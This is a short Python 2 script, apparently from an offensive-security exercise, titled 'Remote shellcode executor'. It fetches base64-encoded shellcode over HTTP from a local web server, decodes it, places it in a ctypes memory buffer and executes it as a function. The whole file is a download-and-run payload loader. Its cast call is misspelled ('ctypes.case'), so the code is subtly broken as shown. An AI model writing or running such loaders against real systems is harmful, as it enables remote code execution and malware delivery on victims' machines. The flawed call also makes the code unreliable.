#Remote shellcode executor
#ideas for improvement: detection of encoding method and decoding for different methods

import urllib2
import ctypes
import base64

#retrieve the shellcode from our webserver
url = "http://localhost:8000/shellcode.bin"
response = urllib2.urlopen(url)

#decode the shellcode from base64
shellcode = base64.b64decode(response.read())

#create a buffer in memory
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

#create a function pointer to our shellcode
shellcode_func = ctypes.case(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

#call shellcode
shellcode_func()